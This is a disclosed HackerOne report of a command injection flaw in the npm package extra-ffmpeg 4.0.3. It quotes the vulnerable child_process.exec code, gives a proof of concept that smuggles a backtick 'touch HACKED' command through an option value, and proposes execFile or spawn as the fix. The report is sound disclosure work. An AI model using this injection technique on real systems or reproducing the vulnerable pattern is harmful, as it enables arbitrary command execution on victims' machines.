# [extra-ffmpeg] Command Injection via insecure command formatting

## Report Details
- **Report ID**: 863944
- **URL**: https://hackerone.com/reports/863944
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-05-01T11:15:06.209Z
- **Disclosed**: 2020-08-20T09:08:41.263Z

## Reporter
- **Username**: d3lla
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `Command Injection` issue in the `extra-ffmpeg` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `extra-ffmpeg`
**version:** `4.0.3`
**npm page:** `https://www.npmjs.com/package/extra-ffmpeg`

## Module Description

Decode, encode, transcode, mux, demux, stream, filter, and play media through machine (via "ffmpeg").

## Module Stats

[99] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any check. 

Here's the code which causes the issue:

```javascript
// https://github.com/nodef/extra-ffmpeg/blob/master/index.js#L19
const cp = require('child_process');


// Global variables.
const STDIO = [0, 1, 2];


 // Generate command for ffmpeg.
 function command(os) {
  var z = 'ffmpeg';
  var os = os||[];
  for(var o of os) {
    var o = o||{};
    for(var k in o) {
      if(o[k]==null) continue;
      if(k==='stdio') continue;
      if(k==='o' || k==='outfile') z += ` "${o[k]}"`;
      else if(typeof o[k]==='boolean') z += o[k]? ` -${k}`:'';
      else z += ` -${k} ${JSON.stringify(o[k])}`;  // <-- injection
    }
  }
  return z;
};

/**
 * Invoke "ffmpeg" synchronously.
 * @param {object} os ffmpeg options.
 */
function sync(os) {
  var stdio = os.stdio===undefined? STDIO:os.stdio;
  return cp.execSync(command(os), {stdio});
};

/**
 * Invoke "ffmpeg" asynchronously.
 * @param {object} os ffmpeg options.
 */
function ffmpeg(os) {
  var stdio = os.stdio===undefined? STDIO:os.stdio;
  return new Promise((fres, frej) => cp.exec(command(os), {stdio}, (err, stdout, stderr) => {
    if(err) frej(err);
    else fres({stdout, stderr});
  }));
};
ffmpeg.sync = sync;
module.exports = ffmpeg;
```
The `os` parameter contains the option parameters for the command `ffmpeg`. 
The final command that is passed to the `child_process.exec` function is built formatting the options value without any check.


## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `extra-ffmpeg` module:
    -  `npm i extra-ffmpeg`
- create the following PoC JavaScript file (`poc.js`):

```javascript
const ffmpeg = require('extra-ffmpeg');
ffmpeg.sync([{y: true}, {i: '`touch HACKED`'}, {acodec: 'copy', o: 'aud.mp3'}]);

```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`
    
{F810821}


## Patch
Do not concatenate/format commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v13.13.0
- NPM VERSION: 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Command Injection on `extra-ffmpeg` module via insecure command formatting.

## Attachments
- poc_extra-ffmpeg.mov
